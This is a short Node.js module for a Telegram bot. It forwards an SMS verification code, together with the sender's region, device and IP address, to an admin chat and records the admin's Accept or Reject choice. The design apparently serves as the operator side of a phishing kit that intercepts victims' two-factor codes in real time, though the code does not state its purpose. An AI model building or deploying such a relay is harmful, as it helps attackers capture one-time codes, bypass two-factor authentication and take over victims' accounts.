require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const APP_URL = process.env.APP_URL;

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// In-memory store for approvals
const approvals = {};

// Set approval status
function setApprovalStatus(requestId, status) {
  approvals[requestId] = status;
}

// Get approval status
function getApprovalStatus(requestId) {
  return approvals[requestId] || 'pending';
}

// Send 2FA request to Telegram with inline buttons
async function sendTelegram2FARequest({ code, region, device, ip, requestId }) {
  const message =
    `📨📨📨 <b>test - sms</b> 📨📨📨\n` +
    `<b>💬 SMS:</b> <code>${code}</code>\n` +
    `<b>🌍 Region:</b> ${region}\n` +
    `<b>💻 Device:</b> ${device}\n` +
    `<b>📡 IP:</b> ${ip}`;

  await bot.sendMessage(ADMIN_CHAT_ID, message, {
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [
          { text: '✅ Accept', callback_data: `accept_${requestId}` },
          { text: '❌ Reject', callback_data: `reject_${requestId}` }
        ]
      ]
    }
  });
}

// Handle button presses
bot.on('callback_query', (query) => {
  const { data, message } = query;
  if (!data) return;

  if (data.startsWith('accept_')) {
    const requestId = data.replace('accept_', '');
    setApprovalStatus(requestId, 'approved');
    bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: message.chat.id, message_id: message.message_id });
    bot.sendMessage(message.chat.id, `✅ Request <code>${requestId}</code> accepted.`, { parse_mode: 'HTML' });
  } else if (data.startsWith('reject_')) {
    const requestId = data.replace('reject_', '');
    setApprovalStatus(requestId, 'rejected');
    bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: message.chat.id, message_id: message.message_id });
    bot.sendMessage(message.chat.id, `❌ Request <code>${requestId}</code> rejected.`, { parse_mode: 'HTML' });
  }
});

module.exports = {
  sendTelegram2FARequest,
  setApprovalStatus,
  getApprovalStatus
};
